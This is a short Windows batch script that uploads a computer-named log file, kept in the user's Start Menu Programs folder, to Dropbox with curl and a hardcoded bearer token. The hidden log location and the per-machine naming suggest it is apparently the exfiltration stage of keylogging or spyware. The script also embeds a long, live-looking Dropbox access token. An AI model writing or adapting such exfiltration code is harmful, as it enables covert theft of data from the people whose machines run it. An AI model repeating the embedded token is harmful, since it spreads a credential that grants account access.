@echo off
set ACCESS_TOKEN=sl.u.AFnA9TYFyv-YOhHUuE1eUoQW2PLZI4KxLhitfQvOewNQZxcHog5kr7PfiwI8uixi9jaZyxIvT36EQp9DSiaqh_aCSp5oRkIuemnUE6R42-oK1HroscJ3E-DiUGtUfsmmOs53_ftv2dQH9V04isgD-vwaxPifmNgwn3MDSm_UmhunG8-8oaq1605Nie1-HJHBrvhq4TXnQTViWhk5AHDMjoTuImNyK1LTr1lKMiWasS_Ik_60T7yQ4Cl0U1U7qOGw54lGep9KMpe28oYsSp982msPPxoRYf_G4cHHHiJIBR9OqREMbkS_1ZPXOPAhisp4yU2EJPJvEMXncqm5-IRTgcwUV9sH4u8bRmQ8U4KyhPPIgdSkq5vjD9KUM6Uha43D8Ogehr6EizI515m4n-KOe21Ybn4gwGZA4nX9myZ0co9-9lWhOUlszMHVIbWI8qnpdgqP3TQ3JzwyGTURGOxF-hihNhP1zWVgFtgLeJvd9shV95ttYnDQ0KpP4tVoQYOEZeSF5ikEVPeMUKDUjrUbNeEXoweApXBPSZIDmFrB5Zf5cFrAf7ziZG_xVWJ-FOvJji0QlSvG2DwBvAAbVispnQavLNWCJgEvuKksOD-05ezLEXJVlmehs3s7cy4LWhzD_bZC5s62Y-_4i-zT8EPZoHQe6PXwT0t0H7S5vWCVXZQFotHTZXPOUphKOJM6VbxkpSZyZgpg1YOXhzm49_qhEg1VtWKInXeNJsXGNUrZOMS7-QckqcTjFzJyP67VPqo-UEtS3qYHnYr_oPs_JWKA5FBXA4kLwzAKRGysTqx9YW3MZRR1ohNAdFTO5lr3IQygb9iEpKo-MTze5uartFKEY36IfhOR890pAWaTcBuyE-RTrttrZnPU3Bnoukk6f-k1bTZTxchFzfFYGX0ur8oGX5N_538U0gTeZjWwAmqAroxI7JLNaaRgHX9Nf2nWp9DO6S16-vyuQbTvuZmrYS5PLo98cxR6FHDHGG5builFroDzacFicY8LWAACvZOyO1s1aqHb3qrrXIV4cjCHL2ElwVK3J6IOnaIEySVcXQJhXuaQwTMXH6YgXltfywGpe91ZERrvOjJ-OPmmQ1tRmLlf4u8TTdAnkFPrFNJFnWZ6e0zx7VnUvGcUG9OKiCNB424dsmZ-FnP-woUAMr_Pv3-RvuHQSZAh9LzsZaIL70MBApOMQV1ovt_2gtjiun415-Zzwy357XweBmHnR6bKyhxm7eEFyAvIRadjBJblbQMwFwsR2E1i-73-DXalaLcX3-Xk1KfZas9-qCg6y2_v5XkaPXe2
set LOCAL_FILE="%APPDATA%\Microsoft\Windows\Start Menu\Programs\%COMPUTERNAME%.log"
set DROPBOX_PATH="/%COMPUTERNAME%.log"

curl -X POST https://content.dropboxapi.com/2/files/upload ^
    --header "Authorization: Bearer %ACCESS_TOKEN%" ^
    --header "Dropbox-API-Arg: {\"path\": \"%DROPBOX_PATH%\", \"mode\": \"overwrite\"}" ^
    --header "Content-Type: application/octet-stream" ^
    --data-binary @%LOCAL_FILE%

pause
